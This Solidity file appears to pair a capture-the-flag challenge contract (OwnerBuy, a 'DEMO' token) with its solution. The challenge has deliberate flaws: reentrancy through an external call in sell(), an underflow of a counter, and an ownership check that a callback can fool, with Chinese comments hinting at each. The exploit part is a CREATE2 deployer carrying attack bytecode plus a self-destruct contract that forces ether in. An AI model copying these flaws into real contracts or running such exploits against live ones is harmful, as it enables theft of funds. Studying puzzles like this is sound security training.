// 0.5.1-c8a2
// Enable optimization
pragma solidity ^0.5.0;
import "./contracts/ERC20.sol";
import "./contracts/IERC20.sol";
import "./contracts/ERC20Detailed.sol";


interface Changing {
    function isOwner(address) external returns (bool);
}

contract Ownable {
    address public _owner;
    address public _previousOwner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );

        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    //Locks the contract for owner for the amount of time provided
    function lock() public onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    //Unlocks the contract for owner when _lockTime is exceeds
    function unlock() external payable {
        require(msg.value >= 1 ether);
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

contract OwnerBuy is Ownable, ERC20, ERC20Detailed {
    mapping(address => bool) public status;
    mapping(address => uint256) public Times;
    mapping(address => bool) internal whiteList;
    uint256 MAXHOLD = 100;
    event finished(bool);

    constructor() public ERC20Detailed("DEMO", "DEMO", 18) {}

    function isWhite(address addr) public view returns (bool) {
        return whiteList[addr];
    }

    function setWhite(address addr) external onlyOwner returns (bool) {
        whiteList[addr] = true;
        return true;
    }

    function unsetWhite(address addr) external onlyOwner returns (bool) {
        whiteList[addr] = false;
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        if (!isWhite(recipient)) {
            require(_balances[recipient] <= MAXHOLD, "hold overflow");
        }
        emit Transfer(sender, recipient, amount);
    }

    function changestatus(address _owner) public {
        Changing tmp = Changing(msg.sender);
        if (!tmp.isOwner(_owner)) {
            status[msg.sender] = tmp.isOwner(_owner);     //isowner第一次调用时是false，第二次是true
        }
    }

    function changeOwner() public {
        require(tx.origin != msg.sender);    //需要合约调用
         require(uint(msg.sender) & 0xffff == 0xffff);    //地址需要ffff
        if (status[msg.sender] == true) {
            status[msg.sender] = false;
            _owner = msg.sender;
        }
    }

    function buy() public payable returns (bool success) {
        require(_owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D);
        require(tx.origin != msg.sender);
        require(Times[msg.sender] == 0);
        require(_balances[msg.sender] == 0);
        require(msg.value == 1 wei);
        _balances[msg.sender] = 100;
        Times[msg.sender] = 1;
        return true;
    }

    function sell(uint256 _amount) public returns (bool success) {
        require(_amount >= 200);
        require(uint(msg.sender) & 0xffff == 0xffff);
        require(Times[msg.sender] > 0);
        require(_balances[msg.sender] >= _amount);        
        require(address(this).balance >= _amount);      //部署时需满足
        msg.sender.call.gas(1000000)("");
        _transfer(msg.sender, address(this), _amount);
        Times[msg.sender] -= 1;
        return true;
    }

    function finish() public onlyOwner returns (bool) {
        require(Times[msg.sender] >= 100);           //sell溢出
        Times[msg.sender] = 0;
        msg.sender.transfer(address(this).balance);
        emit finished(true);
        return true;
    }
}

contract deployer{
    bytes contractBytecode = hex"608060405273d9145cce52d386f254917e481eb44e9943f39138600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006557600080fd5b50610930806100756000396000f3fe6080604052600436106100915760003560e01c806338a396811161005957806338a39681146102555780634ddd108a1461026c57806368b8d10e14610276578063a08110741461028d578063fe0174bd146102a457610091565b806306661abd146101685780631d63e24d146101935780632ede53a3146101be5780632f54bf6e146101d5578063327aeead1461023e575b6000600154141561016557600160008154809291906001019190505550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561012457600080fd5b505af1158015610138573d6000803e3d6000fd5b505050506040513d602081101561014e57600080fd5b810190808051906020019092919050505050610166565b5b005b34801561017457600080fd5b5061017d6102bb565b6040518082815260200191505060405180910390f35b34801561019f57600080fd5b506101a86102c1565b6040518082815260200191505060405180910390f35b3480156101ca57600080fd5b506101d36102c7565b005b3480156101e157600080fd5b50610224600480360360208110156101f857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061036f565b604051808215151515815260200191505060405180910390f35b34801561024a57600080fd5b506102536103b1565b005b34801561026157600080fd5b5061026a610480565b005b610274610534565b005b34801561028257600080fd5b5061028b610536565b005b34801561029957600080fd5b506102a26105e0565b005b3480156102b057600080fd5b506102b96107be565b005b60005481565b60015481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561033157600080fd5b505af1158015610345573d6000803e3d6000fd5b505050506040513d602081101561035b57600080fd5b810190808051906020019092919050505050565b6000806000541415610395576000808154809291906001019190505550600090506103ac565b600080815480929190600190039190505550600190505b919050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561046657600080fd5b505af115801561047a573d6000803e3d6000fd5b50505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b1580156104f657600080fd5b505af115801561050a573d6000803e3d6000fd5b505050506040513d602081101561052057600080fd5b810190808051906020019092919050505050565b565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156105a157600080fd5b505af11580156105b5573d6000803e3d6000fd5b50505050506040513d60208110156105cc57600080fd5b810190808051906020019092919050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b1580156106a357600080fd5b505af11580156106b7573d6000803e3d6000fd5b505050506040513d60208110156106cd57600080fd5b810190808051906020019092919050505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561078057600080fd5b505af1158015610794573d6000803e3d6000fd5b505050506040513d60208110156107aa57600080fd5b810190808051906020019092919050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561085f57600080fd5b505af1158015610873573d6000803e3d6000fd5b50505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156108e157600080fd5b505af11580156108f5573d6000803e3d6000fd5b5050505056fea265627a7a723158208dbc2ee0a046073718e988a165d479b12d69ba88e5ac7e6d5a3a90e14300b47664736f6c63430005110032";

    function deploy(bytes32 salt) public {
    bytes memory bytecode = contractBytecode;
    address addr;
      
    assembly {
      addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
    }
  }
    function getHash()public returns(bytes32){
      return keccak256(contractBytecode);
}
}

contract hui{
    function des()public payable {
        selfdestruct(0xc4753C8802178e524cdB766D7E47cFc566e34443);
    }
    function receive()external payable    {

    }

}
